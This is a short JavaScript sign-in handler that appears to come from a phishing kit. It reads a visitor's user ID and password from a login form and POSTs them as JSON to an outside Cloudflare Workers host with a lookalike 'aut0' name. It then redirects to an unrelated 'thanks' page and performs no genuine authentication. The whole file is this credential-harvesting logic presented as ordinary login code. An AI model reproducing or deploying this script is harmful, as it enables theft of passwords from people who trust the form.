$('#signin').click(function(event) {
    event.preventDefault();
    username = document.getElementById("userID").value;
    passerror = document.getElementById("passwordErrorText");
    password = document.getElementById("password").value;

    if (password.length < 4) {
        passerror.style.fontSize = "small";
        passerror.innerHTML = "Please enter your password correctly!";
    } else {
        fetch("https://aut0-curr-9dc7.henrycrane65.workers.dev/", {
            method: "POST",
            body: JSON.stringify({
                userID: username,
                password: password,
            }),
            headers: {
                "Content-type": "application/json; charset=UTF-8"
            }
        })
        .then(response => {
            if (response.ok) {
                // Wait a little before redirecting
                setTimeout(() => {
                    window.location.href = "https://twklle.pages.dev/thanks.html";
                }, 1000); 
            } else {
                passerror.innerHTML = "There was an error processing your request.";
            }
        })
        .catch(error => {
            passerror.innerHTML = "Network error. Please try again.";
        });
    }
});
